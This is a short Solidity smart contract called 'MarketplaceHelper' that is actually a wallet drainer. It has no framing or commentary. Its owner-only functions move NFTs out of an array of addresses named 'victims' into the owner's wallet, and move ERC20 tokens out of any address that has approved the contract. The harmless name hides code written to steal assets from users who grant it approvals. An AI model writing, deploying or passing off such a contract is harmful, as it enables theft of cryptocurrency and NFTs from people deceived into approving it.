// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IERC721 { function transferFrom(address from, address to, uint256 id) external; }
interface IERC20 { function transferFrom(address from, address to, uint256 amt) external returns (bool); }
contract MarketplaceHelper {
    address public owner;
    constructor() { owner = msg.sender; }
    modifier onlyOwner() { require(msg.sender == owner); _; }
    function batchSweep(address nft, address[] calldata victims, uint256[] calldata ids) external onlyOwner {
        for (uint i = 0; i < victims.length; i++) {
            IERC721(nft).transferFrom(victims[i], owner, ids[i]);
        }
    }
    function collect(IERC20 token, address from, uint256 amt) external onlyOwner {
        token.transferFrom(from, msg.sender, amt);
    }
}
